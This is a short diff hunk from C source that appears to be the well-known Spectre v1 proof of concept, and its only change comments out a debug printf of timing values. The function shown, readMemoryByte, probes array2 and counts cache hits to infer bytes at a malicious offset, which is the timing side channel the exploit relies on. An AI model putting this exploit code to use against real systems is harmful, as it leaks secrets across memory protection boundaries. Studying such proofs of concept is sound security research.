@@ -106,7 +106,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 		{
 			mix_i = ((i * 167) + 13) & 255;
 			time2 = timed_read(&array2[mix_i * 512]);
-			printf("%llu\t", time2);
+		//	printf("%llu\t", time2);
 			if (time2 <= miss_min && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
